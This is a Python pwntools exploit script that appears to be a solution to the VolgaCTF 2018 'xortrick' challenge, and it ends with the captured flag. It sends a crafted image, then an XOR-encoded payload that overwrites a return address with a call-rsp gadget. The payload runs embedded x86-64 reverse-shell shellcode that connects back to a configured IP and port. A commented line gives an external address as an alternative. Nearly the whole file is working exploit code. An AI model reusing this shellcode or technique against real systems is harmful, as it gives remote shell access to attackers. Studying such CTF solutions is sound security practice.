from pwn import *
import time
import sys

# IPADDR = "\xa7\x58\x72\xd9" # 167.88.114.217
IPADDR = "\x7f\x00\x00\x01" # 127.0.0.1
PORT = "\x7a\x69" # 31337
shellcode = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"+PORT+"\xc7\x44\x24\x04"+IPADDR+"\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
# http://shell-storm.org/shellcode/files/shellcode-857.php
# Shellcode Author  : Russell Willis <codinguy@gmail.com>

def generate_payload(payload):
	result = ""
	payload += "\x90"*(0x10-(len(payload)%0x10))
	for i in xrange(0,len(payload),0x10):
		a = u64(payload[i:i+8])
		b = u64(payload[i+8:i+16])
		c = (b*(2**64))+a
		d = c ^ 0xc5145c1e4210842ac5145c1e4210842a
		# pwndbg> x/2gx 0x7ffff0706c45
		# 0x7ffff0706c45 <xor_trick+37>:  0xc5145c1e4210842a      0xc5145c1e4210842a
		result += p64(d&0xffffffffffffffff)
		result += p64(d>>64)
	result = p64(len(result))+result
	return result

if sys.argv[1]=="1":
	HOST = '127.0.0.1'
	PORT = 45678
else:
	HOST = 'xortrick.quals.2018.volgactf.ru'
	PORT = 45678

call_rsp = 0x000000000043781c # Python 3.5.2 3ca82c498bdce94a835bdb0dfd3c644f

r = remote(HOST,PORT)
filename = "MeePwn.png" # use tweakpng change size 1x1
img = open(filename,"rb").read()
im_file_data = p64(len(img))
im_file_data += img
r.send(im_file_data)

payload = p64(call_rsp)*0xa # overwrite return address
payload += shellcode
data1 = generate_payload(payload)
r.send(data1)

r.interactive()
# VolgaCTF{M@ke_pyth0n_explo1table_ag@in}